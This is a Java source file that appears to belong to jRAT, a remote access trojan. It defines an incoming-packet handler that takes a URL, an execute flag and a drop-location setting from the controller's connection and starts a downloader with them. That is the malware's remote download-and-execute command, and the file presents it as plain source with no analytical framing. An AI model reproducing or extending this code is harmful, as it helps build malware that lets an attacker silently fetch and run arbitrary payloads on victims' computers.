package jrat.client.packets.incoming;

import jrat.client.AdvancedDownloader;
import jrat.client.Connection;

public class Packet34AdvancedDownload extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String url = con.readLine();
		boolean exec = con.readBoolean();
		int drop = con.readInt();
		new AdvancedDownloader(con, url, exec, drop).start();
	}

}
